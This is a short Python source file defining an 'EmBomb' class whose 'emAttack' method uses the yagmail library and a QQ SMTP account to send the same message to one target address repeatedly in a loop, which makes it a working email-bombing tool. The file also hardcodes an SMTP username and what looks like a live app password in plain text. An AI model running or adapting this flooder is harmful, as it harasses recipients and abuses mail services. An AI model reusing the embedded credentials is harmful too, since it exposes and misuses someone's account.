import yagmail
import sys
import time

Green = '\033[92m'
Blue = '\033[94m'
Grey = '\033[0m'
Red = '\033[31m'
White = '\33[97m'
Yellow = '\33[93m'

class EmBomb:
    def __init__(self, To='123456@qq.com', Subject='Hello', Content='Are you ok?', ) -> None:
        self.yag  = yagmail.SMTP(user='3184651657@qq.com',  password='vnokakzcztjidhac', host='smtp.qq.com')
        self.To = To
        self.Subject = Subject
        self.Content = Content

    def emAttack(self, number=10):
        for i in range(number):
            try:
                self.yag.send(to=self.To, subject=self.Subject, contents=self.Content)
            except ValueError:
                sys.stdout.write(Red +'[!]Valid Input!' + Grey)
                
        sys.stdout.write(Green +'Sending completed!' + Grey)
        time.sleep(1)
